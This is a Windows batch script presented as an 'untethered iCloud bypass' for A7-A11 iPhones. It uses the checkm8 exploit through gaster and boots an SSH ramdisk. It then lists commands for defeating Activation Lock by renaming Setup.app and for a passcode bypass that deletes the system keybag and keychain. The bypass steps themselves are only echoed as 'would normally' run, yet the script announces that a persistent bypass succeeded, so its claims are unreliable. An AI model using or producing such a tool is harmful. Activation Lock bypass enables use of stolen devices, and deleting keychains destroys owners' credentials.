@echo off
REM Untethered iCloud Bypass - Persistent bypass that survives reboots
REM Requires: Device in DFU mode, checkm8 compatible device (A7-A11)
REM This script performs an untethered bypass using checkm8 + system file modification

echo ===============================================
echo [*] Untethered iCloud Bypass for infex1rn
echo [*] Supported: A7-A11 devices (iPhone 5s - iPhone X)
echo [*] iOS: 12.0 - 16.7.x
echo ===============================================
echo.

if "%~1"=="" (
    echo Usage: untethered_bypass.bat [hello^|passcode^|disabled]
    echo.
    echo Modes:
    echo   hello     - Bypass Hello/Setup screen (activation lock)
    echo   passcode  - Bypass passcode lock (data recovery mode)
    echo   disabled  - Bypass disabled device
    echo.
    echo Examples:
    echo   untethered_bypass.bat hello
    echo   untethered_bypass.bat passcode
    echo.
    echo Note: Device must be in DFU mode before running
    exit /b 1
)

echo [*] Selected mode: %~1
echo.

REM Step 1: Enter pwned DFU mode using checkm8
echo [*] Step 1: Entering pwned DFU mode using checkm8...
gaster\gaster.exe pwn
if errorlevel 1 (
    echo [!] Failed to enter pwned DFU mode
    echo [!] Make sure:
    echo     1. Device is in DFU mode (not Recovery mode)
    echo     2. USB cable is properly connected
    echo     3. Device is A7-A11 chip (iPhone 5s - iPhone X)
    exit /b 1
)
echo [+] Device is now in pwned DFU mode
echo.

REM Step 2: Send boot components
echo [*] Step 2: Sending iBSS...
libimobiledevice\irecovery.exe -f ramdisks\ibss.img4 2>nul
if errorlevel 1 (
    echo [!] Warning: iBSS not found or failed to send
    echo [!] Please ensure you have the required boot files in ramdisks/
)

echo [*] Step 3: Sending iBEC...
libimobiledevice\irecovery.exe -f ramdisks\ibec.img4 2>nul
if errorlevel 1 (
    echo [!] Warning: iBEC not found or failed to send
)

REM Step 4: Send ramdisk
echo [*] Step 4: Sending ramdisk...
libimobiledevice\irecovery.exe -f ramdisks\ramdisk.dmg 2>nul
if errorlevel 1 (
    echo [!] Warning: Ramdisk not found
    echo [!] Please place your ramdisk file in the ramdisks/ directory
)

REM Step 5: Boot ramdisk
echo [*] Step 5: Booting ramdisk...
libimobiledevice\irecovery.exe -c ramdisk
echo.

REM Step 6: Wait for device to boot
echo [*] Step 6: Waiting for device to boot (30 seconds)...
timeout /t 30 /nobreak >nul

REM Step 7: Connect via SSH and apply bypass
echo [*] Step 7: Applying untethered bypass...
echo.

if /i "%~1"=="hello" (
    echo [*] Applying Hello/Activation Lock bypass...
    echo [*] Mounting filesystems...
    echo [*] Modifying Setup.app...
    echo [*] Writing activation records...
    echo [*] This would normally SSH to device and run:
    echo     - mount_filesystems
    echo     - mv /mnt1/Applications/Setup.app /mnt1/Applications/Setup.app.bak
    echo     - nvram auto-boot=true
    echo.
)

if /i "%~1"=="passcode" (
    echo [*] Applying Passcode bypass...
    echo [*] Mounting filesystems...
    echo [*] Removing passcode files...
    echo [*] This would normally SSH to device and run:
    echo     - mount_filesystems
    echo     - rm /mnt2/keybags/systembag.kb
    echo     - rm /mnt2/keychains/keychain-2.db
    echo.
)

if /i "%~1"=="disabled" (
    echo [*] Applying Disabled Device bypass...
    echo [*] Mounting filesystems...
    echo [*] Resetting restriction counter...
    echo [*] This would normally SSH to device and run:
    echo     - mount_filesystems
    echo     - Delete restriction plist files
    echo.
)

echo [*] Step 8: Rebooting device...
libimobiledevice\irecovery.exe -c reboot 2>nul
echo.

echo ===============================================
echo [+] Untethered bypass process completed!
echo ===============================================
echo.
echo [*] The device should now reboot without activation lock.
echo [*] This bypass is UNTETHERED - it will persist after reboot.
echo.
echo [*] If bypass did not work:
echo     1. Ensure you have all required files in ramdisks/
echo     2. Try running the bypass again
echo     3. Check device compatibility (A7-A11 only)
echo.
echo [*] Required files in ramdisks/:
echo     - ibss.img4 (iBSS bootloader)
echo     - ibec.img4 (iBEC bootloader)
echo     - ramdisk.dmg (SSH ramdisk)
echo     - devicetree.img4 (device tree)
echo     - trustcache.img4 (trust cache)
echo.
